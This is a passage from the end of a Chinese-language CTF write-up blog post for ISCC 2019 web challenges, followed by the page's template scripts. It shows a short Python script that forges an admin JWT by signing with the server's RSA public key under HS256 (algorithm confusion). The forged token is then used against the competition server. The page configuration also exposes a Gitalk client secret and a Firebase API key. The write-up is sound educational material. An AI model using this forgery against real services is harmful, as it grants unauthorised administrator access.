+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;pubkey&quot;:&quot;-----BEGIN PUBLIC KEY-----\nMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDMRTzM9ujkHmh42aXG0aHZk/PK\nomh6laVF+c3+D+klIjXglj7+/wxnztnhyOZpYxdtk7FfpHa3Xh4Pkpd5VivwOu1h\nKk3XQYZeMHov4kW0yuS+5RpFV1Q2gm/NWGY52EaQmpCNFQbGNigZhu95R2OoMtuc\nIC+LX+9V/mpyKe9R3wIDAQAB\n-----END PUBLIC KEY-----&quot;,&quot;result&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用脚本将加密算法置空或者改为HS256（对称加密），把上面的公钥放在1.txt文件里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">public = open(<span class="string">'1.txt'</span>, <span class="string">'r'</span>).read()</span><br><span class="line">print(jwt.encode(&#123;<span class="string">"name"</span>: <span class="string">"12332112"</span>,<span class="string">"priv"</span>: <span class="string">"admin"</span>&#125;, key=public, algorithm=<span class="string">'HS256'</span>))</span><br></pre></td></tr></table></figure>
+
+<p>后得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiMTIzMzIxMTIiLCJwcml2IjoiYWRtaW4ifQ.IulW498rWKk9cs38oRe3c7hBrF130CwzDbe346yldzQ</span><br></pre></td></tr></table></figure>
+
+<p>在list界面带上这个访问<br><img src="ISCC-2019-Web-Writeup/4.png" alt></p>
+<p>最后在生成paste的界面<br>访问 <a href="http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277" target="_blank" rel="noopener">http://39.100.83.188:8053/text/admin:22f1e0aa7a31422ad63480aa27711277</a><br>得到flag…</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>P2hm1n</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/" title="ISCC 2019 Web Writeup">https://p2hm1n.github.io/2019/06/09/ISCC-2019-Web-Writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/07/SQL注入一把梭/" rel="next" title="SQL注入一把梭">
+                <i class="fa fa-chevron-left"></i> SQL注入一把梭
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/09/工具一把梭/" rel="prev" title="工具一把梭">
+                工具一把梭 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/lufei.jpg" alt="P2hm1n">
+            
+              <p class="site-author-name" itemprop="name">P2hm1n</p>
+              <div class="site-description motion-element" itemprop="description">ONE PIECE</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">8</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://github.com/P2hm1n" title="GitHub &rarr; https://github.com/P2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="/qq7832919@gmail.com" title="E-Mail &rarr; qq7832919@gmail.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <a href="https://twitter.com/p2hm1n" title="Twitter &rarr; https://twitter.com/p2hm1n" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            </div>
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Web1"><span class="nav-number">1.</span> <span class="nav-text">Web1</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web2"><span class="nav-number">2.</span> <span class="nav-text">Web2</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web3"><span class="nav-number">3.</span> <span class="nav-text">Web3</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web4"><span class="nav-number">4.</span> <span class="nav-text">Web4</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web5"><span class="nav-number">5.</span> <span class="nav-text">Web5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web6"><span class="nav-number">6.</span> <span class="nav-text">Web6</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P2hm1n</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.1.2"></script>
+
+  <script src="/js/motion.js?v=7.1.2"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.1.2"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.1.2"></script>
+<script src="/js/post-details.js?v=7.1.2"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.1.2"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '355064866eb0a9c2de67',
+    clientSecret: '2e624255d41f832c93f2b3d8d828ecb1020eac9c',
+    repo: 'Gitalk',
+    owner: 'P2hm1n',
+    admin: [''],
+    id: md5(location.pathname),
+    
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase-firestore.js"></script>
+  
+  <script>
+    (function () {
+
+      firebase.initializeApp({
+        apiKey: 'AIzaSyCDQ4n4iCo1yBkV-vwZmbaCxR8JgT7zTi4',
+        projectId: 'blog-6ef40'
+      })
+
+      function getCount(doc, increaseCount) {
+        //increaseCount will be false when not in article page
+
+        return doc.get().then(function (d) {
+          var count
+          if (!d.exists) { //has no data, initialize count
+            if (increaseCount) {
+              doc.set({
+                count: 1
+              })
+              count = 1
+            }
+            else {
+              count = 0
+            }
+          }
+          else { //has data
+            count = d.data().count
+            if (increaseCount) {
+              if (!(window.localStorage && window.localStorage.getItem(title))) { //if first view this article
+                doc.set({ //increase count
+                  count: count + 1
+                })
+                count++
+              }
+            }
+          }
+          if (window.localStorage && increaseCount) { //mark as visited
+            localStorage.setItem(title, true)
+          }
+
+          return count
+        })
+      }
+
+      function appendCountTo(el) {
+        return function (count) {
+          $(el).append(
+            $('<span>').addClass('post-visitors-count').append(
+              $('<span>').addClass('post-meta-divider').text('|')
+            ).append(
+              $('<span>').addClass('post-meta-item-icon').append(
+                $('<i>').addClass('fa fa-users')
+              )
+              ).append($('<span>').text('阅读次数 ' + count))
+          )
+        }
+      }
+
+      var db = firebase.firestore()
+      var articles = db.collection('articles')
+
+      //https://hexo.io/docs/variables.html
+      var isPost = 'ISCC 2019 Web Writeup'.length > 0
+      var isArchive = '' === 'true'
+      var isCategory = ''.length > 0
+      var isTag = ''.length > 0
+
+      if (isPost) { //is article page
+        var title = 'ISCC 2019 Web Writeup'
+        var doc = articles.doc(title)
+
+        getCount(doc, true).then(appendCountTo($('.post-meta')))
+      }
+      else if (!isArchive && !isCategory && !isTag) { //is index page
+        var titles = [] //array to titles
+
+        var postsstr = '' //if you have a better way to get titles of posts, please change it
+        eval(postsstr)
+
+        var promises = titles.map(function (title) {
+          return articles.doc(title)
+        }).map(function (doc) {
+          return getCount(doc)
+        })
+        Promise.all(promises).then(function (counts) {
+          var metas = $('.post-meta')
+          counts.forEach(function (val, idx) {
+            appendCountTo(metas[idx])(val)
+          })
+        })
+      }
+    })()
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  <script src="/js/wobblewindow.js"></script>
+  <script>
+    //只在桌面版网页启用特效
+    if( window.innerWidth > 768  ){
+      $(document).ready(function () {
+        
+          $('#header').wobbleWindow({
+            radius: 50,
+            movementTop: false,
+            movementLeft: false,
+            movementRight: false,
+            debug: false,
+          });
+        
+
+        
+          $('#sidebar').wobbleWindow({
+            radius: 50,
+            movementLeft: false,
+            movementTop: false,
+            movementBottom: false,
+            position: 'fixed',
+            debug: false,
+          });
+        
+
+        
+          $('#footer').wobbleWindow({
+            radius: 50,
+            movementBottom: false,
+            movementLeft: false,
+            movementRight: false,
+            offsetX: ,
+            position: 'absolute',
+            debug: false,
+          });
+        
+      });
+    }
+  </script>
+
+
+
+
+  <script src="/js/activate-power-mode.min.js"></script>
+  <script>
+    POWERMODE.colorful = true;
+    POWERMODE.shake = false;
+    document.body.addEventListener('input', POWERMODE);
+  </script>
+
+  <script type="text/javascript" src="/js/love.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
